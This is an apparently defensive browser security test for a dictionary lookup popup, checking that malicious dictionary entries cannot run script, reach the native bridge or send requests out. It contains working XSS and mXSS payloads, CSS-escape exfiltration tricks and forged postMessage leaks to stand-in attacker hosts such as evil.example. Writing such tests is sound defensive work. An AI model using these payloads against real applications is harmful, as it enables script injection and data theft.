// BUG-3705 / BUG-3706：恶意词典内容不能在查词弹窗主文档里执行脚本、调原生桥或外联。
//
// 在真 Chrome 里加载生产 dict-media.js + selection.js + popup.js（与 popup.html 同序），
// 原生桥换成记录器，逐个场景渲染词典块再检查主文档与桥调用记录。沙箱 iframe 里发生了
// 什么，靠词典脚本自己经 postMessage 报一条 error 消息出来（父页面转成 reportJsError
// 调用，记录器能看到）。
//
// 不覆盖：Android addJavascriptInterface 那类「桥注入所有 frame」的宿主行为——那由各平台
// 原生的桥锁定补丁负责（见 docs/specs/2026-10-23-dictionary-script-sandbox.md）。
import fs from 'node:fs';
import http from 'node:http';
import assert from 'node:assert/strict';
import { launchChromeDriver, resolveChrome } from '../../../tool/reader_pitch_headless/cdp_client.mjs';

if (!resolveChrome()) {
  console.log('Chrome unavailable');
  process.exit(77);
}
// 唯一参数是 Dart 测试刚写的临时 payload 文件（仓库里的生产脚本），不是外部输入。
const scripts = JSON.parse(fs.readFileSync(process.argv[2], 'utf8'));  // NOSONAR: path comes from the Dart test harness

const LOCKED = 'fushi-bridge-locked-v1';

// 「攻击者服务器」：记录收到的每个请求（`/page` 除外——那是下面 evalOnServedPage 供测试页
// 用的）。外联场景的测试页从 http://localhost 供、攻击者地址用 127.0.0.1：两者不同源，
// CSP 的 'self' 放不过攻击者；又都是 http 源，Chrome 不会因为顶层是 data: 文档就自己拦掉
// 子 frame 的导航——那样「沙箱自导航」场景测的就是浏览器的限制而不是我们的防护。
const hits = [];
let servedPage = '';
const server = http.createServer((req, res) => {
  if (req.url === '/page') {
    res.setHeader('content-type', 'text/html; charset=utf-8');
    res.end(servedPage);
    return;
  }
  hits.push(req.url);
  res.setHeader('content-type', req.url.startsWith('/nav') ? 'text/html' : 'text/plain');
  res.end(req.url.startsWith('/nav')
    ? '<script>parent.postMessage({__fushiDictSandbox:1,type:"error",message:"from-evil:"+location.href},"*")</script>'
    : '');
});
await new Promise((resolve) => server.listen(0, '127.0.0.1', resolve));
const PORT = server.address().port;
const EVIL = `http://127.0.0.1:${PORT}`;
const PAGE_URL = `http://localhost:${PORT}/page`;
const realHits = () => hits.filter((u) => u !== '/favicon.ico');

async function evalOnServedPage(html, expr) {
  servedPage = html;
  await driver.evalOnPage('<p>reset</p>', '1');
  await driver.evalHere(`(location.href = ${JSON.stringify(PAGE_URL)}, 1)`);
  const deadline = Date.now() + 8000;
  while (Date.now() < deadline) {
    await new Promise((r) => setTimeout(r, 100));
    try {
      if (await driver.evalHere(
        "location.href.endsWith('/page') && document.readyState === 'complete' && " +
        "typeof createGlossarySection === 'function'")) break;
    } catch (_) { /* 导航中，上下文还没换好 */ }
  }
  hits.length = 0;
  return driver.evalHere(expr);
}

// parentActive：把父页面的 navigator.userActivation 钉成 isActive = true，模拟「用户刚在
// 释义里随便点了一下」——这正是沙箱脚本借机伪造动作消息的前提。
function page(lockReply, dictStyles, parentActive) {
  const bridge = `
    ${parentActive ? "Object.defineProperty(navigator, 'userActivation', { configurable: true, value: { isActive: true, hasBeenActive: true } });" : ''}
    window.__calls = [];
    window.flutter_inappwebview = {
      callHandler(name, ...args) {
        window.__calls.push({ name, args: JSON.parse(JSON.stringify(args)) });
        if (name === '_fushiLockBridge') return Promise.resolve(${JSON.stringify(lockReply)});
        if (name === 'getDictAsset') return Promise.resolve('window.__extLoaded = 1;');
        return Promise.resolve(null);
      },
    };
    window.dictionaryStyles = ${JSON.stringify(dictStyles || {})};
  `;
  const esc = (s) => s.replace(/<\/script/gi, '<\\/script');
  return '<!doctype html><html><head><meta charset="utf-8">' +
    `<script>${esc(bridge)}</script>` +
    `<script>${esc(scripts.dictMedia)}</script>` +
    `<script>${esc(scripts.selection)}</script>` +
    `<script>${esc(scripts.popup)}</script>` +
    '</head><body></body></html>';
}

// 渲染一个词典块，等锁桥 + iframe 加载 + 消息往返，然后回报主文档状态。
function renderExpr(content) {
  return `(async () => {
    const details = createGlossarySection('D', [{ content: ${JSON.stringify(content)},
      definitionTags: '', termTags: '', glossaryIndex: 0 }], 0, 0, 1);
    document.body.appendChild(details);
    await new Promise((r) => setTimeout(r, 1500));
    const frames = [...document.querySelectorAll('iframe')];
    return {
      pwned: window.__pwned === undefined ? null : String(window.__pwned),
      scriptsInMain: document.querySelectorAll('body script').length,
      onAttrs: [...document.body.querySelectorAll('*')]
        .flatMap((el) => [...el.attributes].map((a) => a.name))
        .filter((n) => n.startsWith('on')),
      hrefs: [...document.body.querySelectorAll('[href]')].map((el) => el.getAttribute('href')),
      srcs: [...document.body.querySelectorAll('[src]')].map((el) => el.getAttribute('src')),
      frames: frames.map((f) => ({ sandbox: f.getAttribute('sandbox'), csp: f.getAttribute('csp'),
        height: f.style.height })),
      documentCsp: (document.querySelector('meta[data-fushi-popup-csp]') || {}).content || null,
      calls: window.__calls.map((c) => c.name),
      reports: window.__calls.filter((c) => c.name === 'reportJsError')
        .map((c) => (c.args[0] && c.args[0].message) || ''),
      text: document.body.textContent,
      dictStyle: [...document.querySelectorAll('style.fushi-dict-style')].map((s) => s.textContent).join('\\n'),
    };
  })()`;
}

const SCRIPTED = `<div id="t">static</div>
<script>
  var reach = 'blocked';
  try { reach = typeof parent.flutter_inappwebview; } catch (e) { reach = 'blocked'; }
  try { window.top.__pwned = 'top'; } catch (e) {}
  document.getElementById('t').textContent = 'ran';
  window.__pwned = 'iframe-only';
  setTimeout(function () {
    parent.postMessage({ __fushiDictSandbox: 1, type: 'error',
      message: 'probe:' + document.getElementById('t').textContent + ':' + reach + ':' + (window.__extLoaded || 0) }, '*');
    parent.postMessage({ __fushiDictSandbox: 1, type: 'select', text: 'spam', rect: {} }, '*');
    parent.postMessage({ __fushiDictSandbox: 1, type: 'link', href: 'https://evil.example/', text: 'x', rect: {} }, '*');
  }, 50);
</script>
<script src="ext.js"></script>`;

const driver = await launchChromeDriver();
let passed = 0;
try {
  // 1. 结构化内容：标签白名单 + 危险 href。
  {
    const r = await driver.evalOnPage(page(LOCKED), renderExpr(JSON.stringify({
      type: 'structured-content',
      content: [
        { tag: 'script', content: "window.__pwned = 'sc-script'" },
        { tag: 'a', href: "javascript:window.__pwned='sc-href'", content: 'link' },  // NOSONAR: attack payload asserted not to execute
        { tag: 'iframe', content: 'framed' },
        { tag: 'span', style: { backgroundImage: 'url(https://evil.example/t.png)' }, content: 'bg' },
      ],
    })));
    assert.equal(r.pwned, null, 'structured content must not execute');
    assert.equal(r.scriptsInMain, 0, 'no <script> element from structured content');
    assert.equal(r.frames.length, 0, 'no iframe element from structured content');
    assert.ok(!r.hrefs.some((h) => /javascript:/i.test(h)), `javascript: href stripped (${r.hrefs})`);  // NOSONAR: checks that the payload href was stripped; nothing is evaluated
    assert.ok(!/evil\.example/.test(JSON.stringify(r)), 'remote background url dropped');
    assert.ok(r.text.includes('link') && r.text.includes('framed'), 'content of unknown tags is kept');
    passed++;
  }

  // 2. 不带脚本的 HTML 释义：净化后留在主文档。
  {
    const r = await driver.evalOnPage(page(LOCKED), renderExpr(
      '<img src="x" onerror="window.__pwned=\'onerror\'">' +
      '<svg onload="window.__pwned=\'svg\'"><a xlink:href="javascript:1"><text>s</text></a></svg>' +  // NOSONAR: attack payload asserted not to execute
      '<a href="javascript:window.__pwned=\'click\'">bad</a><a href="https://example.com/">ok</a>' +  // NOSONAR: attack payload asserted not to execute
      '<img src="https://evil.example/t.png"><form action="https://evil.example/"><input></form>' +
      '<p style="background:url(https://evil.example/s.png)">styled</p>'));
    assert.equal(r.pwned, null, `inline handlers must not run (${r.pwned})`);
    assert.deepEqual(r.onAttrs, [], 'on* attributes stripped');
    assert.ok(!r.hrefs.some((h) => /javascript:/i.test(h)), `javascript: href stripped (${r.hrefs})`);  // NOSONAR: checks that the payload href was stripped; nothing is evaluated
    assert.ok(r.hrefs.includes('https://example.com/'), 'normal external link kept');
    assert.ok(!r.srcs.some((s) => /evil\.example/.test(s)), `remote img src stripped (${r.srcs})`);
    assert.ok(!/evil\.example/.test(JSON.stringify(r)), 'no remote reference left anywhere');
    assert.ok(r.text.includes('styled'), 'content kept');
    passed++;
  }

  // 3. 带脚本的 HTML 释义 + 桥锁定成功：脚本只在沙箱 iframe 里跑。
  {
    const r = await driver.evalOnPage(page(LOCKED), renderExpr(SCRIPTED));
    assert.equal(r.pwned, null, `dictionary script must not touch the main window (${r.pwned})`);
    assert.equal(r.scriptsInMain, 0, 'no script element in the main document');
    assert.equal(r.frames.length, 1, 'scripted block mounted into one iframe');
    assert.equal(r.frames[0].sandbox, 'allow-scripts', 'sandbox without allow-same-origin');
    assert.ok(r.frames[0].csp && /default-src 'none'/.test(r.frames[0].csp),
      'embedder csp attribute constrains the frame after navigation too');
    assert.ok(r.calls.includes('_fushiLockBridge'), 'page asked the host to lock the bridge');
    assert.ok(r.calls.includes('getDictAsset'), 'external script fetched by the parent');
    const probe = r.reports.find((m) => m.includes('probe:'));
    assert.ok(probe, `sandbox reported back (${r.reports})`);
    assert.ok(probe.includes('probe:ran:blocked:1'),
      `script ran inside the sandbox, could not reach the parent bridge, external script inlined (${probe})`);
    assert.ok(!r.calls.includes('textSelected'), 'unsolicited select from the sandbox is dropped');
    assert.ok(!r.calls.includes('openLink'), 'unsolicited link from the sandbox is dropped');
    assert.notEqual(r.frames[0].height, '0px', 'iframe height follows its content');
    passed++;
  }

  // 4. 宿主回的不是专用值（没实现锁定）：不挂沙箱，只显示净化后的静态内容。
  for (const reply of [true, null, 'ok']) {
    const r = await driver.evalOnPage(page(reply), renderExpr(SCRIPTED));
    assert.equal(r.pwned, null, `no script may run when the bridge is not locked (${reply})`);
    assert.equal(r.frames.length, 0, `no sandbox without a confirmed lock (${reply})`);
    assert.ok(r.text.includes('static'), 'static content still shown');
    assert.ok(!r.calls.includes('getDictAsset'), 'scripts not even fetched');
  }
  passed++;

  // 5. 词典 styles.css：@import 与外部 url() 不进样式表，本地 url() 保留。
  {
    const r = await driver.evalOnPage(page(LOCKED, {
      D: "@import url('https://evil.example/x.css'); .a { background: url(https://evil.example/y.png); }" +
        ' .b { background: url(//evil.example/z.png); } .c { background: url(local.png); }',
    }), renderExpr(JSON.stringify({ type: 'structured-content', content: 'css' })));
    assert.ok(!/evil\.example/.test(r.dictStyle), `remote css refs stripped (${r.dictStyle})`);
    assert.ok(!/@import/i.test(r.dictStyle), '@import stripped');
    assert.ok(r.dictStyle.includes('local.png'), 'local url kept');
    passed++;
  }

  // 6. mXSS：净化后的树直接挂进文档，不经「序列化 → innerHTML」再解析（审查复现过 math 路径）。
  for (const [name, html] of [
    ['math-mglyph-style', '<math><mtext><table><mglyph><style><img src=x onerror="window.__pwned=\'mx\';' +
      "flutter_inappwebview.callHandler('updateEntry',{id:1})\"></style></mglyph></table></mtext></math>"],
    ['form-math-reparent', '<form><math><mtext></form><form><mglyph><style></math>' +
      '<img src=x onerror="window.__pwned=\'form\'">'],
    ['svg-style-text', '<svg><style>&lt;img src=x onerror=window.__pwned=\'svg\'&gt;</style></svg>'],
    ['noscript-title', '<noscript><p title="</noscript><img src=x onerror=window.__pwned=\'ns\'>"></noscript>'],
    ['title-link-quote', "<span title=\"<link href='a'><img src=x onerror=window.__pwned='lq'>\">t</span>"],
  ]) {
    const r = await driver.evalOnPage(page(LOCKED), renderExpr(html));
    assert.equal(r.pwned, null, `${name}: main document must not execute (${r.pwned})`);
    assert.ok(!r.calls.includes('updateEntry'), `${name}: bridge must not be reached`);
    assert.deepEqual(r.onAttrs, [], `${name}: no live event handler attribute`);
  }
  passed++;

  // 7. 导出卡片路径同样不能经 tempDiv.innerHTML 复活脚本（tempDiv 属于主文档）。
  {
    const mx = '<math><mtext><table><mglyph><style><img src=x onerror="window.__pwned=\'export\'">' +
      '</style></mglyph></table></mtext></math>';
    const r = await driver.evalOnPage(page(LOCKED), `(async () => {
      window.lookupEntries = [{ glossaries: [{ dictionary: 'D', content: ${JSON.stringify(mx)},
        definitionTags: '', termTags: '' }] }];
      const html = constructGlossaryHtml(0);
      await new Promise((r) => setTimeout(r, 500));
      return { pwned: window.__pwned === undefined ? null : String(window.__pwned), html: String(html) };
    })()`);
    assert.equal(r.pwned, null, `export path must not execute (${r.pwned})`);
    assert.ok(!/onerror/i.test(r.html), `exported HTML carries no handler (${r.html.slice(0, 200)})`);
    passed++;
  }

  // 8. 外联兜底：正则追不完的写法（CSS 转义、image-set、imagesrcset、srcset、样式表里的
  //    转义 @import）一个请求都不能发出去——主文档 CSP 的 img/style/font-src 只认本地。
  {
    const cases = [
      `<p style="background:\\75rl(${EVIL}/esc-attr)">a</p>`,
      `<p style="background-image:image-set('${EVIL}/imgset' 1x)">b</p>`,
      `<style>@\\69mport '${EVIL}/imp-esc';</style><p>c</p>`,
      `<link rel="preload" as="image" imagesrcset="${EVIL}/preload 1x"><p>d</p>`,
      `<img srcset="${EVIL}/srcset 1x"><p>e</p>`,
      JSON.stringify({ type: 'structured-content', content: [
        { tag: 'span', style: { backgroundImage: `\\75rl(${EVIL}/sc-esc)` }, content: 'f' }] }),
    ];
    for (const content of cases) {
      const r = await evalOnServedPage(page(LOCKED, {
        D: `@\\69mport '${EVIL}/dictcss-imp'; .x { background: \\75rl(${EVIL}/dictcss-url); }`,
      }), renderExpr(content));
      assert.ok(r.documentCsp && /img-src/.test(r.documentCsp), 'document CSP installed');
      assert.deepEqual(realHits(), [], `no request may leave the popup (${content.slice(0, 80)})`);
    }
    passed++;
  }

  // 9. 沙箱自导航：frame-src 在请求发出前拦住，frame 第二次 load 即被移除，导航后的页面
  //    （若真加载了）发来的消息也不被认。
  {
    const r = await evalOnServedPage(page(LOCKED), renderExpr(
      `<div>s</div><script>setTimeout(function(){ location.href = '${EVIL}/nav?w=' + 'TERM'; }, 50);</script>`));
    assert.deepEqual(realHits(), [], `sandbox self-navigation must not reach the network (${hits})`);
    assert.equal(r.frames.length, 0, 'navigated sandbox frame is removed');
    assert.ok(!r.reports.some((m) => m.includes('from-evil')), 'messages from a navigated frame are ignored');
    passed++;
  }

  // 10. 父页面有用户激活时（用户随便点了一下释义），沙箱脚本伪造的外链消息也不放行：
  //     父页面判断不了「点的就是这条链接」，所以沙箱来源只认回查词 / sound: 本地音频。
  //     同一 frame 随后发的回查词链接必须照常生效——证明激活确实成立，外链是被判据挡下
  //     而不是因为没激活被顺带丢掉（否则这条断言是空壳）。
  {
    const r = await driver.evalOnPage(page(LOCKED, {}, true), renderExpr(`<div>s</div><script>
      setTimeout(function () {
        parent.postMessage({ __fushiDictSandbox: 1, type: 'link',
          href: 'https://evil.example/leak?q=TERM', text: 'x', rect: {} }, '*');
      }, 50);
      setTimeout(function () {
        parent.postMessage({ __fushiDictSandbox: 1, type: 'link',
          href: '?query=word', text: 'word', rect: {} }, '*');
      }, 450);
    </script>`));
    assert.equal(r.frames.length, 1, 'scripted block mounted into one iframe');
    assert.ok(!r.calls.includes('openLink'),
      `external link forged by the sandbox must not open even with parent activation (${r.calls})`);
    assert.ok(r.calls.includes('onLinkClick'),
      `lookup link from the same sandbox still works, so activation was in effect (${r.calls})`);
    passed++;
  }
} finally {
  await driver.close();
  server.close();
}
console.log(`PASS ${passed} dictionary sandbox scenarios`);
